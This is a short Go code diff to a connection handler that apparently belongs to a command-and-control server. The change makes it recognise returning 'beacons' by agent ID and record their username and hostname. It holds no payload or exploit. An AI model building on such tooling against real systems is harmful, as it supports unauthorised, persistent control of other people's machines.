@@ -61,19 +61,25 @@ func handleConnection(conn net.Conn) {
 	}
 
 	parts := strings.Split(strings.TrimSpace(message), ":")
-	if len(parts) != 2 {
+	if len(parts) != 3 {
 		log.Printf("invalid message format: %s", message)
 		return
 	}
-	username := parts[0]
-	hostname := parts[1]
+	agentID := parts[0]
+	username := parts[1]
+	hostname := parts[2]
 
-	a := agent.NewAgent(username, hostname, conn.RemoteAddr().String())
 	agentMu.Lock()
-	agents[a.ID] = a
+	a, exists := agents[agentID]
+	if !exists {
+		a = agent.NewAgent(username, hostname, conn.RemoteAddr().String())
+		a.ID = agentID
+		agents[agentID] = a
+		log.Printf("new agent registered: %s", agentID)
+	} else {
+		log.Printf("returning beacon: %s", agentID)
+	}
 	agentMu.Unlock()
-
-	log.Printf("agent registered: %s", a.ID)
 
 	ackMesg := strings.ToUpper(strings.TrimSpace(message))
 	response := fmt.Sprintf("ACK: %s\n", ackMesg)
